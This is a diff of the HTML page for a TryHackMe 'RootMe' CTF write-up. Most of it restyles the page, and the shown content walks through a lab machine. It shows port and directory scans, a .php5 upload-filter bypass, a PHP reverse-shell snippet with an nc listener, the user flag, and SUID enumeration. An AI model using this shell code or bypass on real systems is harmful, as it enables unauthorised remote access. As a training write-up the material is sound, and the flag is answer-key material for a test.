@@ -4,265 +4,393 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>RootMe CTF Writeup | 0xb0rn3</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=JetBrains+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        :root {
+            --black:      #000000;
+            --bg:         #0a0908;
+            --bg-card:    #141210;
+            --bg-field:   #1a1816;
+            --bg-raised:  #211f1c;
+            --gray-2:     #504945;
+            --gray-3:     #3c3836;
+            --gray-4:     #282828;
+            --fg:         #ebdbb2;
+            --fg-muted:   #a89984;
+            --fg-dim:     #665c54;
+            --white:      #fbf1c7;
+            --yellow:     #fabd2f;
+            --orange:     #fe8019;
+            --aqua:       #8ec07c;
+            --red:        #fb4934;
+            --blue:       #83a598;
+            --purple:     #d3869b;
+            --green:      #b8bb26;
+            --border:     rgba(235,219,178,.10);
+            --border-mid: rgba(235,219,178,.22);
+            --border-hi:  rgba(250,189,47,.5);
+            --glow-y:     0 0 30px rgba(250,189,47,.15);
+            --glow-r:     0 0 30px rgba(251,73,52,.12);
+            --r-xs:   6px;
+            --r-sm:   12px;
+            --r:      18px;
+            --r-lg:   24px;
+            --r-pill: 999px;
         }
 
-        :root {
-            --bg: #1d2021;
-            --bg-soft: #282828;
-            --fg: #ebdbb2;
-            --red: #fb4934;
-            --green: #b8bb26;
-            --yellow: #fabd2f;
-            --blue: #83a598;
-            --purple: #d3869b;
-            --aqua: #8ec07c;
-            --orange: #fe8019;
-            --gray: #928374;
-        }
+        *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+        ::selection { background:var(--yellow); color:var(--black); }
+        html { scroll-behavior:smooth; }
 
         body {
-            font-family: 'JetBrains Mono', 'Courier New', monospace;
-            background: var(--bg);
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--black);
             color: var(--fg);
             line-height: 1.8;
-            padding: 20px;
+            overflow-x: hidden;
         }
 
+        /* ── Canvas ── */
+        #matrixCanvas { position:fixed; inset:0; z-index:0; pointer-events:none; opacity:.05; }
+        .grain {
+            position:fixed; inset:0; z-index:1; pointer-events:none; opacity:.03;
+            background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+            background-size:256px;
+        }
+        .scanline {
+            position:fixed; inset:0; z-index:1; pointer-events:none;
+            background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.03) 2px,rgba(0,0,0,.03) 4px);
+        }
+
+        /* ── Scroll Progress ── */
+        .scroll-progress {
+            position:fixed; top:0; left:0;
+            width:0%; height:2px;
+            background:linear-gradient(90deg,var(--red),var(--orange),var(--yellow));
+            z-index:9999; transition:width .08s linear;
+        }
+
+        /* ── Nav ── */
+        .nav {
+            position:fixed; top:0; left:0; right:0; z-index:1000;
+            backdrop-filter:blur(24px) saturate(1.4);
+            background:rgba(0,0,0,.8);
+            border-bottom:1px solid var(--border);
+            transition:all .35s cubic-bezier(.4,0,.2,1);
+        }
+        .nav.scrolled { background:rgba(0,0,0,.95); border-bottom-color:var(--border-mid); box-shadow:0 8px 32px rgba(0,0,0,.7); }
+        .nav-content {
+            max-width:1200px; margin:0 auto;
+            padding:.75rem 2rem;
+            display:flex; justify-content:space-between; align-items:center;
+        }
+        .nav-logo {
+            font-family:'Orbitron',monospace; font-size:1rem; font-weight:900;
+            color:var(--yellow); text-decoration:none;
+            display:flex; align-items:center; gap:.5rem;
+            letter-spacing:3px; transition:all .25s;
+            text-shadow:0 0 20px rgba(250,189,47,.3);
+        }
+        .nav-logo:hover { color:var(--orange); }
+        .nav-logo .br { color:var(--fg-dim); font-weight:400; }
+        .nav-links { display:flex; gap:2px; list-style:none; align-items:center; }
+        .nav-link {
+            color:var(--fg-dim); text-decoration:none;
+            font-size:.68rem; font-weight:600;
+            text-transform:uppercase; letter-spacing:1.5px;
+            display:flex; align-items:center; gap:.4rem;
+            padding:.4rem .75rem; border-radius:var(--r-xs);
+            transition:all .2s ease; position:relative;
+        }
+        .nav-link::after {
+            content:''; position:absolute; bottom:2px; left:50%; right:50%;
+            height:1px; background:var(--yellow); transition:all .25s ease;
+        }
+        .nav-link:hover { color:var(--yellow); }
+        .nav-link:hover::after { left:20%; right:20%; }
+        .nav-link i { font-size:.62rem; }
+
+        .menu-toggle { display:none; flex-direction:column; gap:5px; background:none; border:none; cursor:pointer; padding:5px; z-index:1001; }
+        .menu-toggle span { width:20px; height:1.5px; background:var(--fg); display:block; transition:all .3s ease; }
+        .menu-toggle.active span:nth-child(1){transform:rotate(45deg) translate(5px,5px)}
+        .menu-toggle.active span:nth-child(2){opacity:0}
+        .menu-toggle.active span:nth-child(3){transform:rotate(-45deg) translate(5px,-5px)}
+
+        .mobile-nav { position:fixed; top:0; right:-100%; width:min(85%,360px); height:100dvh; background:rgba(10,9,8,.98); border-left:1px solid var(--border-mid); padding:5rem 1.5rem 2rem; transition:right .35s cubic-bezier(.4,0,.2,1); z-index:999; overflow-y:auto; }
+        .mobile-nav.active { right:0; }
+        .mobile-nav-links { list-style:none; display:flex; flex-direction:column; gap:.5rem; }
+        .mobile-nav-link { color:var(--fg-muted); text-decoration:none; font-size:.85rem; font-weight:600; text-transform:uppercase; letter-spacing:1.5px; display:flex; align-items:center; gap:1rem; padding:.85rem 1.2rem; border:1px solid var(--border); border-radius:var(--r-sm); transition:all .2s ease; }
+        .mobile-nav-link:hover { color:var(--yellow); border-color:rgba(250,189,47,.35); background:rgba(250,189,47,.05); transform:translateX(4px); }
+        .mobile-nav-link i { width:18px; font-size:1rem; }
+        .mobile-overlay { position:fixed; inset:0; background:rgba(0,0,0,.75); opacity:0; visibility:hidden; transition:all .3s ease; z-index:998; backdrop-filter:blur(4px); }
+        .mobile-overlay.active { opacity:1; visibility:visible; }
+
+        /* ── Layout ── */
         .container {
-            max-width: 900px;
-            margin: 0 auto;
+            max-width:920px; margin:0 auto;
+            padding:5.5rem 1.5rem 3rem;
+            position:relative; z-index:10;
         }
 
-        header {
-            background: var(--bg-soft);
-            border: 4px solid var(--red);
-            padding: 40px;
-            margin-bottom: 40px;
+        /* ── Writeup Header ── */
+        .writeup-header {
+            background:var(--bg-card);
+            border:1px solid rgba(251,73,52,.3);
+            border-radius:var(--r-lg);
+            padding:clamp(1.5rem,4vw,2.5rem);
+            margin-bottom:2rem;
+            position:relative; overflow:hidden;
+        }
+        .writeup-header::before {
+            content:'';position:absolute;top:0;left:0;right:0;height:2px;
+            background:linear-gradient(90deg,var(--red),var(--orange),var(--yellow));
         }
 
         .back-link {
-            display: inline-block;
-            color: var(--aqua);
-            text-decoration: none;
-            margin-bottom: 20px;
-            font-weight: bold;
-            transition: all 0.2s;
+            display:inline-flex; align-items:center; gap:.4rem;
+            color:var(--aqua); text-decoration:none;
+            font-size:clamp(.62rem,1.5vw,.72rem); font-weight:700;
+            text-transform:uppercase; letter-spacing:1.5px;
+            margin-bottom:1.2rem;
+            padding:.3rem .7rem;
+            border:1px solid rgba(142,192,124,.22);
+            border-radius:var(--r-pill);
+            background:rgba(142,192,124,.04);
+            transition:all .2s;
         }
+        .back-link:hover { background:var(--aqua); color:var(--black); }
 
-        .back-link:hover {
-            color: var(--yellow);
-            transform: translateX(-4px);
+        .writeup-header h1 {
+            font-family:'Orbitron',monospace;
+            font-size:clamp(1.6rem,4.5vw,2.5rem);
+            font-weight:900; color:var(--white);
+            letter-spacing:.04em; line-height:1.15;
+            margin-bottom:.8rem;
         }
+        .writeup-header h1 .accent { color:var(--red); }
 
-        h1 {
-            font-size: 2.5rem;
-            color: var(--red);
-            margin-bottom: 15px;
-            text-transform: uppercase;
+        .meta-row {
+            display:flex; gap:.5rem; flex-wrap:wrap; margin-top:.8rem;
         }
-
-        .meta {
-            display: flex;
-            gap: 20px;
-            flex-wrap: wrap;
-            margin-top: 20px;
-            color: var(--gray);
+        .meta-pill {
+            font-size:clamp(.52rem,1.3vw,.6rem);
+            font-weight:700; letter-spacing:1.5px;
+            text-transform:uppercase;
+            padding:3px 10px;
+            border-radius:var(--r-pill);
+            border:1px solid var(--border);
+            color:var(--fg-dim);
         }
+        .meta-pill.platform { background:rgba(184,187,38,.1); border-color:rgba(184,187,38,.3); color:var(--green); }
+        .meta-pill.difficulty { background:rgba(250,189,47,.1); border-color:rgba(250,189,47,.3); color:var(--yellow); }
 
-        .meta-item {
-            padding: 8px 16px;
-            background: var(--bg);
-            border: 2px solid var(--gray);
-        }
-
-        .platform-badge {
-            background: var(--green);
-            color: var(--bg);
-            border-color: var(--green);
-            font-weight: bold;
-        }
-
-        .difficulty-badge {
-            background: var(--yellow);
-            color: var(--bg);
-            border-color: var(--yellow);
-            font-weight: bold;
-        }
-
+        /* ── Article ── */
         article {
-            background: var(--bg-soft);
-            border: 3px solid var(--green);
-            padding: 40px;
-            margin-bottom: 40px;
+            background:var(--bg-card);
+            border:1px solid var(--border);
+            border-radius:var(--r-lg);
+            padding:clamp(1.5rem,4vw,2.5rem);
+            margin-bottom:2rem;
         }
 
         h2 {
-            color: var(--yellow);
-            font-size: 1.8rem;
-            margin-top: 40px;
-            margin-bottom: 20px;
-            padding-bottom: 10px;
-            border-bottom: 3px solid var(--yellow);
+            font-family:'Orbitron',monospace;
+            color:var(--yellow); font-size:clamp(1.1rem,2.8vw,1.5rem);
+            font-weight:900; letter-spacing:.04em;
+            margin-top:2.5rem; margin-bottom:1rem;
+            padding-bottom:.5rem;
+            border-bottom:1px solid rgba(250,189,47,.22);
         }
+        h2:first-child { margin-top:0; }
 
         h3 {
-            color: var(--blue);
-            font-size: 1.4rem;
-            margin-top: 30px;
-            margin-bottom: 15px;
+            color:var(--blue); font-size:clamp(.85rem,2.2vw,1.05rem);
+            font-weight:700; margin-top:1.8rem; margin-bottom:.8rem;
         }
+        h4 { color:var(--orange); font-size:clamp(.78rem,2vw,.92rem); margin-top:1.2rem; margin-bottom:.5rem; }
 
-        p {
-            margin-bottom: 15px;
-        }
+        p { margin-bottom:.85rem; font-size:clamp(.72rem,1.8vw,.84rem); color:var(--fg-muted); }
+        article a { color:var(--aqua); text-decoration:none; transition:color .2s; }
+        article a:hover { color:var(--yellow); }
 
-        ul, ol {
-            margin-left: 30px;
-            margin-bottom: 20px;
-        }
+        strong { color:var(--fg); }
 
-        li {
-            margin-bottom: 8px;
-        }
+        ul, ol { margin-left:1.5rem; margin-bottom:1rem; }
+        li { margin-bottom:.4rem; font-size:clamp(.7rem,1.7vw,.82rem); color:var(--fg-muted); }
+        li strong { color:var(--fg); }
 
         code {
-            background: var(--bg);
-            color: var(--orange);
-            padding: 2px 6px;
-            border: 1px solid var(--gray);
-            font-family: 'JetBrains Mono', monospace;
+            background:var(--bg-raised);
+            color:var(--orange);
+            padding:1px 5px;
+            border:1px solid var(--border);
+            border-radius:var(--r-xs);
+            font-family:'JetBrains Mono',monospace;
+            font-size:.9em;
         }
 
         pre {
-            background: var(--bg);
-            border: 3px solid var(--purple);
-            padding: 20px;
-            overflow-x: auto;
-            margin: 20px 0;
+            background:var(--bg);
+            border:1px solid rgba(211,134,155,.22);
+            border-radius:var(--r-sm);
+            padding:1rem 1.2rem;
+            overflow-x:auto;
+            margin:1rem 0;
+            line-height:1.7;
         }
+        pre code { background:none; border:none; color:var(--fg); padding:0; font-size:clamp(.65rem,1.6vw,.76rem); }
 
-        pre code {
-            background: none;
-            border: none;
-            color: var(--fg);
-            padding: 0;
-        }
-
+        /* ── Tables ── */
         table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 20px 0;
-            background: var(--bg);
+            width:100%; border-collapse:collapse;
+            margin:1rem 0; font-size:clamp(.65rem,1.6vw,.76rem);
         }
-
         th {
-            background: var(--purple);
-            color: var(--bg);
-            padding: 12px;
-            text-align: left;
-            border: 2px solid var(--purple);
-            font-weight: bold;
+            background:rgba(211,134,155,.15);
+            color:var(--purple); padding:.6rem .8rem;
+            text-align:left; border:1px solid rgba(211,134,155,.22);
+            font-weight:700; text-transform:uppercase; letter-spacing:1px;
+            font-size:clamp(.55rem,1.3vw,.65rem);
         }
+        td { padding:.5rem .8rem; border:1px solid var(--border); color:var(--fg-muted); }
+        tr:nth-child(even) { background:rgba(255,255,255,.015); }
 
-        td {
-            padding: 10px 12px;
-            border: 2px solid var(--gray);
-        }
-
-        tr:nth-child(even) {
-            background: var(--bg-soft);
-        }
-
+        /* ── Blockquote (Answers) ── */
         blockquote {
-            border-left: 4px solid var(--aqua);
-            background: var(--bg);
-            padding: 15px 20px;
-            margin: 20px 0;
-            color: var(--aqua);
-            font-weight: bold;
+            border-left:3px solid var(--aqua);
+            background:rgba(142,192,124,.04);
+            border-radius:0 var(--r-sm) var(--r-sm) 0;
+            padding:.8rem 1.2rem;
+            margin:1rem 0;
+            color:var(--aqua);
+            font-weight:600;
+            font-size:clamp(.7rem,1.7vw,.82rem);
         }
 
+        /* ── Flag Box ── */
         .flag {
-            background: var(--red);
-            color: var(--fg);
-            padding: 15px;
-            margin: 20px 0;
-            border: 3px solid var(--red);
-            font-weight: bold;
-            text-align: center;
-            font-size: 1.1rem;
+            background:rgba(251,73,52,.1);
+            border:1px solid rgba(251,73,52,.35);
+            border-radius:var(--r-sm);
+            padding:1rem;
+            margin:1rem 0;
+            font-weight:700;
+            text-align:center;
+            font-size:clamp(.78rem,2vw,.92rem);
+            color:var(--red);
+            text-shadow:0 0 20px rgba(251,73,52,.2);
         }
 
+        /* ── Attack Chain ── */
         .attack-chain {
-            background: var(--bg);
-            border: 3px solid var(--green);
-            padding: 30px;
-            margin: 30px 0;
-            font-family: monospace;
-            white-space: pre;
-            overflow-x: auto;
-            line-height: 2;
+            background:var(--bg);
+            border:1px solid rgba(142,192,124,.22);
+            border-radius:var(--r-sm);
+            padding:1.2rem 1.5rem;
+            margin:1.2rem 0;
+            font-family:monospace;
+            font-size:clamp(.6rem,1.4vw,.72rem);
+            white-space:pre; overflow-x:auto;
+            line-height:2;
+            color:var(--fg-dim);
         }
 
+        /* ── Highlight Box ── */
         .highlight-box {
-            background: var(--bg);
-            border: 3px solid var(--orange);
-            padding: 20px;
-            margin: 20px 0;
+            background:var(--bg);
+            border:1px solid rgba(254,128,25,.22);
+            border-radius:var(--r-sm);
+            padding:1rem 1.2rem;
+            margin:1.2rem 0;
         }
+        .highlight-box h4 { color:var(--orange); margin-bottom:.5rem; margin-top:0; }
+        .highlight-box p { font-size:clamp(.68rem,1.7vw,.78rem); }
+        .highlight-box ul { margin-bottom:0; }
+        .highlight-box.green { border-color:rgba(142,192,124,.22); }
+        .highlight-box.green h4 { color:var(--aqua); }
+        .highlight-box.blue { border-color:rgba(131,165,152,.22); }
+        .highlight-box.blue h4 { color:var(--blue); }
 
-        .highlight-box h4 {
-            color: var(--orange);
-            margin-bottom: 10px;
+        /* ── Footer ── */
+        .writeup-footer {
+            border-top:1px solid var(--border);
+            background:var(--bg-card);
+            border-radius:var(--r-lg);
+            padding:clamp(1.2rem,3vw,1.8rem);
+            text-align:center;
+            position:relative; z-index:10;
         }
-
-        footer {
-            text-align: center;
-            padding: 30px;
-            background: var(--bg-soft);
-            border: 3px solid var(--gray);
+        .writeup-footer p {
+            font-size:clamp(.55rem,1.4vw,.64rem);
+            color:var(--fg-dim); letter-spacing:1.5px;
         }
+        .writeup-footer a { color:var(--aqua); text-decoration:none; font-weight:700; }
+        .writeup-footer a:hover { color:var(--yellow); }
 
-        footer a {
-            color: var(--aqua);
-            text-decoration: none;
-            font-weight: bold;
-        }
+        /* ── Scroll Top ── */
+        .scroll-top { position:fixed; bottom:1.2rem; right:1.2rem; z-index:1000; width:40px; height:40px; border-radius:var(--r-sm); background:var(--bg-card); color:var(--yellow); border:1px solid var(--border-mid); display:flex; align-items:center; justify-content:center; cursor:pointer; font-size:.9rem; opacity:0; pointer-events:none; transition:all .25s ease; box-shadow:0 4px 16px rgba(0,0,0,.4); }
+        .scroll-top.visible { opacity:1; pointer-events:auto; }
+        .scroll-top:hover { background:var(--yellow); color:var(--black); transform:translateY(-2px); }
 
-        footer a:hover {
-            color: var(--yellow);
-        }
+        /* Scrollbar */
+        ::-webkit-scrollbar { width:6px; }
+        ::-webkit-scrollbar-track { background:var(--black); }
+        ::-webkit-scrollbar-thumb { background:var(--gray-2); border-radius:var(--r-pill); }
+        ::-webkit-scrollbar-thumb:hover { background:var(--yellow); }
 
-        @media (max-width: 768px) {
-            h1 {
-                font-size: 1.8rem;
-            }
-
-            article {
-                padding: 20px;
-            }
-
-            pre {
-                font-size: 0.85rem;
-            }
+        @media (max-width:768px) {
+            .nav-links { display:none; }
+            .menu-toggle { display:flex; }
+            .container { padding:5rem 1rem 2rem; }
         }
     </style>
 </head>
 <body>
+
+    <canvas id="matrixCanvas"></canvas>
+    <div class="grain"></div>
+    <div class="scanline"></div>
+    <div class="scroll-progress" id="scrollProgress"></div>
+    <div class="mobile-overlay" id="mobileOverlay"></div>
+
+    <!-- Nav -->
+    <nav class="nav" id="navbar">
+        <div class="nav-content">
+            <a href="../main.html" class="nav-logo"><span class="br">[</span>0xb0rn3<span class="br">]</span></a>
+            <ul class="nav-links">
+                <li><a href="../main.html#about" class="nav-link"><i class="fas fa-terminal"></i>About</a></li>
+                <li><a href="https://github.com/0xb0rn3" target="_blank" class="nav-link"><i class="fas fa-code"></i>Projects</a></li>
+                <li><a href="../main.html#certifications" class="nav-link"><i class="fas fa-certificate"></i>Certs</a></li>
+                <li><a href="../main.html#platforms" class="nav-link"><i class="fas fa-flag"></i>Platforms</a></li>
+                <li><a href="../blog.html" class="nav-link"><i class="fas fa-pen-nib"></i>Blog</a></li>
+                <li><a href="../CTF.html" class="nav-link" style="color:var(--yellow);"><i class="fas fa-trophy"></i>CTF</a></li>
+                <li><a href="../contact.html" class="nav-link"><i class="fas fa-satellite-dish"></i>Contact</a></li>
+            </ul>
+            <button class="menu-toggle" id="menuToggle" aria-label="Toggle navigation"><span></span><span></span><span></span></button>
+        </div>
+    </nav>
+    <div class="mobile-nav" id="mobileNav">
+        <ul class="mobile-nav-links">
+            <li><a href="../main.html#about" class="mobile-nav-link"><i class="fas fa-terminal"></i>About</a></li>
+            <li><a href="https://github.com/0xb0rn3" target="_blank" class="mobile-nav-link"><i class="fas fa-code"></i>Projects</a></li>
+            <li><a href="../main.html#certifications" class="mobile-nav-link"><i class="fas fa-certificate"></i>Certifications</a></li>
+            <li><a href="../CTF.html" class="mobile-nav-link" style="color:var(--yellow);border-color:rgba(250,189,47,.3);"><i class="fas fa-trophy"></i>CTF</a></li>
+            <li><a href="../contact.html" class="mobile-nav-link"><i class="fas fa-satellite-dish"></i>Contact</a></li>
+        </ul>
+    </div>
+
     <div class="container">
-        <header>
-            <a href="CTF.html" class="back-link">← Back to CTF Writeups</a>
-            <h1>RootMe - TryHackMe CTF</h1>
-            <div class="meta">
-                <span class="meta-item platform-badge">TryHackMe</span>
-                <span class="meta-item difficulty-badge">Easy</span>
-                <span class="meta-item">Date: February 16, 2026</span>
-                <span class="meta-item">Author: 0xb0rn3 | 0xbv1</span>
+
+        <!-- Writeup Header -->
+        <header class="writeup-header">
+            <a href="../CTF.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to CTF Writeups</a>
+            <h1><span class="accent">RootMe</span> — TryHackMe CTF</h1>
+            <div class="meta-row">
+                <span class="meta-pill platform">TryHackMe</span>
+                <span class="meta-pill difficulty">Easy</span>
+                <span class="meta-pill">Feb 16, 2026</span>
+                <span class="meta-pill">0xb0rn3 | 0xbv1</span>
             </div>
         </header>
 
@@ -276,68 +404,47 @@
                 <li>SUID binary abuse for privilege escalation</li>
             </ol>
 
-            <div class="highlight-box" style="border-color: var(--green); margin-top: 30px;">
-                <h4 style="color: var(--green);">🤖 Automation Available</h4>
-                <p>I've created a full automation script (<code>rootmeautopwn</code>) that performs the entire exploitation chain automatically. The script is available in my <a href="https://github.com/0xb0rn3/CTFS/tree/main/THM/rootmeCTF" target="_blank" style="color: var(--aqua);">CTFS GitHub repository</a>.</p>
-                <p style="margin-top: 10px;"><strong>Skip to:</strong> <a href="#automation-script" style="color: var(--yellow);">Automation Script Breakdown</a> to see how it works, or continue reading for the manual walkthrough.</p>
+            <div class="highlight-box green" style="margin-top:1.5rem;">
+                <h4><i class="fas fa-robot"></i> Automation Available</h4>
+                <p>I've created a full automation script (<code>rootmeautopwn</code>) that performs the entire exploitation chain automatically. The script is available in my <a href="https://github.com/0xb0rn3/CTFS/tree/main/THM/rootmeCTF" target="_blank">CTFS GitHub repository</a>.</p>
+                <p style="margin-top:.5rem;"><strong>Skip to:</strong> <a href="#automation-script" style="color:var(--yellow);">Automation Script Breakdown</a> to see how it works, or continue reading for the manual walkthrough.</p>
             </div>
 
-            <h3>📑 Table of Contents</h3>
-            <ul style="margin-bottom: 30px;">
+            <h3><i class="fas fa-list"></i> Table of Contents</h3>
+            <ul style="margin-bottom:1.5rem;">
                 <li><strong>Manual Exploitation:</strong>
                     <ul>
-                        <li><a href="#phase1" style="color: var(--aqua);">Phase 1: Reconnaissance</a></li>
-                        <li><a href="#phase2" style="color: var(--aqua);">Phase 2: Directory Enumeration</a></li>
-                        <li><a href="#phase3" style="color: var(--aqua);">Phase 3: File Upload Bypass</a></li>
-                        <li><a href="#phase4" style="color: var(--aqua);">Phase 4: Privilege Escalation</a></li>
+                        <li><a href="#phase1">Phase 1: Reconnaissance</a></li>
+                        <li><a href="#phase2">Phase 2: Directory Enumeration</a></li>
+                        <li><a href="#phase3">Phase 3: File Upload Bypass</a></li>
+                        <li><a href="#phase4">Phase 4: Privilege Escalation</a></li>
                     </ul>
                 </li>
                 <li><strong>Automation:</strong>
                     <ul>
-                        <li><a href="#automation-script" style="color: var(--yellow);">🤖 Script Breakdown & Tutorial</a></li>
+                        <li><a href="#automation-script" style="color:var(--yellow);"><i class="fas fa-robot"></i> Script Breakdown &amp; Tutorial</a></li>
                     </ul>
                 </li>
                 <li><strong>Analysis:</strong>
                     <ul>
-                        <li><a href="#lessons" style="color: var(--purple);">Lessons Learned & Defense</a></li>
+                        <li><a href="#lessons" style="color:var(--purple);">Lessons Learned &amp; Defense</a></li>
                     </ul>
                 </li>
             </ul>
 
+            <!-- ════ PHASE 1 ════ -->
             <h2 id="phase1">Phase 1: Reconnaissance</h2>
 
-            <h3>Port Scanning & Service Detection</h3>
+            <h3>Port Scanning &amp; Service Detection</h3>
             <pre><code>nmap -sV -sC -p 80,443,8080 10.49.170.219</code></pre>
 
             <p><strong>Results:</strong></p>
             <table>
-                <thead>
-                    <tr>
-                        <th>Port</th>
-                        <th>State</th>
-                        <th>Service</th>
-                        <th>Version</th>
-                    </tr>
-                </thead>
+                <thead><tr><th>Port</th><th>State</th><th>Service</th><th>Version</th></tr></thead>
                 <tbody>
-                    <tr>
-                        <td>80</td>
-                        <td>open</td>
-                        <td>http</td>
-                        <td>Apache httpd 2.4.41 (Ubuntu)</td>
-                    </tr>
-                    <tr>
-                        <td>443</td>
-                        <td>closed</td>
-                        <td>https</td>
-                        <td>-</td>
-                    </tr>
-                    <tr>
-                        <td>8080</td>
-                        <td>closed</td>
-                        <td>http-proxy</td>
-                        <td>-</td>
-                    </tr>
+                    <tr><td>80</td><td>open</td><td>http</td><td>Apache httpd 2.4.41 (Ubuntu)</td></tr>
+                    <tr><td>443</td><td>closed</td><td>https</td><td>-</td></tr>
+                    <tr><td>8080</td><td>closed</td><td>http-proxy</td><td>-</td></tr>
                 </tbody>
             </table>
 
@@ -352,16 +459,14 @@
 
             <h3>HTTP Header Confirmation</h3>
             <pre><code>curl -sI http://10.49.170.219/</code></pre>
-
             <pre><code>HTTP/1.1 200 OK
 Server: Apache/2.4.41 (Ubuntu)
 Set-Cookie: PHPSESSID=...; path=/
 Content-Type: text/html; charset=UTF-8</code></pre>
 
-            <blockquote>
-                <strong>Answer:</strong> The Apache version running is <strong>2.4.41</strong>
-            </blockquote>
+            <blockquote><strong>Answer:</strong> The Apache version running is <strong>2.4.41</strong></blockquote>
 
+            <!-- ════ PHASE 2 ════ -->
             <h2 id="phase2">Phase 2: Directory Enumeration</h2>
 
             <h3>Gobuster Scan</h3>
@@ -369,54 +474,22 @@ Content-Type: text/html; charset=UTF-8</code></pre>
   -w /usr/share/dirb/wordlists/common.txt \
   -t 10 --timeout 60s</code></pre>
 
-            <p><strong>Results:</strong></p>
             <table>
-                <thead>
-                    <tr>
-                        <th>Path</th>
-                        <th>Status</th>
-                        <th>Description</th>
-                    </tr>
-                </thead>
+                <thead><tr><th>Path</th><th>Status</th><th>Description</th></tr></thead>
                 <tbody>
-                    <tr>
-                        <td>/index.php</td>
-                        <td>200</td>
-                        <td>Main page</td>
-                    </tr>
-                    <tr>
-                        <td>/css</td>
-                        <td>301</td>
-                        <td>Stylesheet directory</td>
-                    </tr>
-                    <tr>
-                        <td>/js</td>
-                        <td>301</td>
-                        <td>JavaScript directory</td>
-                    </tr>
-                    <tr style="background: rgba(251, 73, 52, 0.1);">
-                        <td><strong>/panel</strong></td>
-                        <td>301</td>
-                        <td><strong>Upload panel (hidden directory!)</strong></td>
-                    </tr>
-                    <tr>
-                        <td>/uploads</td>
-                        <td>301</td>
-                        <td>Uploaded files directory</td>
-                    </tr>
-                    <tr>
-                        <td>/server-status</td>
-                        <td>403</td>
-                        <td>Forbidden</td>
-                    </tr>
+                    <tr><td>/index.php</td><td>200</td><td>Main page</td></tr>
+                    <tr><td>/css</td><td>301</td><td>Stylesheet directory</td></tr>
+                    <tr><td>/js</td><td>301</td><td>JavaScript directory</td></tr>
+                    <tr style="background:rgba(251,73,52,.06);"><td><strong>/panel</strong></td><td>301</td><td><strong>Upload panel (hidden directory!)</strong></td></tr>
+                    <tr><td>/uploads</td><td>301</td><td>Uploaded files directory</td></tr>
+                    <tr><td>/server-status</td><td>403</td><td>Forbidden</td></tr>
                 </tbody>
             </table>
 
-            <blockquote>
-                <strong>Answer:</strong> The hidden directory is <strong>/panel/</strong>
-            </blockquote>
+            <blockquote><strong>Answer:</strong> The hidden directory is <strong>/panel/</strong></blockquote>
 
-            <h2 id="phase3">Phase 3: Exploitation - File Upload Bypass</h2>
+            <!-- ════ PHASE 3 ════ -->
+            <h2 id="phase3">Phase 3: Exploitation — File Upload Bypass</h2>
 
             <h3>Discovering the Upload Form</h3>
             <p>Navigating to <code>http://10.49.170.219/panel/</code> reveals a file upload form:</p>
@@ -428,12 +501,12 @@ Content-Type: text/html; charset=UTF-8</code></pre>
             <h3>Testing the Filter</h3>
             <p>Attempting to upload a <code>.php</code> file returns:</p>
             <pre><code>PHP não é permitido!</code></pre>
-            <p><em>Translation: "PHP is not allowed!" - The server blocks <code>.php</code> extensions.</em></p>
+            <p><em>Translation: "PHP is not allowed!" — The server blocks <code>.php</code> extensions.</em></p>
 
             <h3>Bypass Strategy</h3>
             <p>The filter only checks for the <code>.php</code> extension. Alternative PHP extensions that Apache will still execute:</p>
             <ul>
-                <li><code>.php5</code> (used successfully) ✅</li>
+                <li><code>.php5</code> (used successfully) &#x2705;</li>
                 <li><code>.phtml</code></li>
                 <li><code>.php3</code>, <code>.php4</code></li>
                 <li><code>.phps</code></li>
@@ -449,20 +522,18 @@ $shell = 'uname -a; w; id; /bin/bash -i';
 
 $sock = fsockopen($ip, $port, $errno, $errstr, 30);
 $descriptorspec = array(
-   0 => array("pipe", "r"),
-   1 => array("pipe", "w"),
-   2 => array("pipe", "w")
+   0 =&gt; array("pipe", "r"),
+   1 =&gt; array("pipe", "w"),
+   2 =&gt; array("pipe", "w")
 );
 $process = proc_open($shell, $descriptorspec, $pipes);
-// ... (full reverse shell code)
 ?&gt;</code></pre>
 
-            <h3>Upload & Execution</h3>
+            <h3>Upload &amp; Execution</h3>
             <pre><code># Upload the shell
-curl -X POST -F "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7c1a151019290c10131d18413c0f14191010520c140c49">[email&#160;protected]</a>" \
+curl -X POST -F "fileUpload=@shell.php5" \
   -F "submit=Upload" http://10.49.170.219/panel/
-# Response: "O arquivo foi upado com sucesso!" 
-# (The file was uploaded successfully!)
+# Response: "O arquivo foi upado com sucesso!"
 
 # Start listener
 nc -lvnp 4444
@@ -474,21 +545,18 @@ curl http://10.49.170.219/uploads/shell.php5</code></pre>
 
             <h3>User Flag</h3>
             <pre><code>cat /var/www/user.txt</code></pre>
+            <div class="flag">&#x1f6a9; USER FLAG: THM{y0u_g0t_a_sh3ll}</div>
 
-            <div class="flag">
-                🚩 USER FLAG: THM{y0u_g0t_a_sh3ll}
-            </div>
-
+            <!-- ════ PHASE 4 ════ -->
             <h2 id="phase4">Phase 4: Privilege Escalation</h2>
 
             <h3>SUID Binary Enumeration</h3>
             <pre><code>find / -perm -4000 -type f 2>/dev/null</code></pre>
 
-            <p><strong>SUID binaries found:</strong></p>
             <pre><code>/usr/bin/newuidmap
 /usr/bin/newgidmap
 /usr/bin/chsh
-/usr/bin/python2.7    <-- UNUSUAL!
+/usr/bin/python2.7    &lt;-- UNUSUAL!
 /usr/bin/at
 /usr/bin/chfn
 /usr/bin/gpasswd
@@ -497,23 +565,20 @@ curl http://10.49.170.219/uploads/shell.php5</code></pre>
 /usr/bin/passwd
 /usr/bin/pkexec</code></pre>
 
-            <blockquote>
